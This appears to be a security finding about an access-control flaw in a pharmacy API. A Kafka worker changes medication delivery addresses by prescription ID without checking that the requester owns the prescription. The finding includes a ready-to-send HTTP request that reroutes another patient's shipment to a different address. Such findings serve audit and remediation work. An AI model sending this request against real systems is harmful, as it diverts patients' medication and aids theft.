diagnosis: The Kafka worker consumes prescription reschedule events and updates delivery addresses in PrescriptionFulfillment by prescriptionId. It never verifies that actorPatientId matches the patientId registered on the prescription record. Any patient or attacker can re-route medication shipments of other patients to their own home address.
exploit_request:
POST /api/pharmacy/reschedule-request HTTP/1.1
Host: pharmacy.medexpress.com
Authorization: Bearer <patient_token>
Content-Type: application/json

{"prescriptionId": "rx_order_990142", "newDeliveryAddress": "456 Shady Pines Blvd", "scheduledDate": "2026-09-10"}
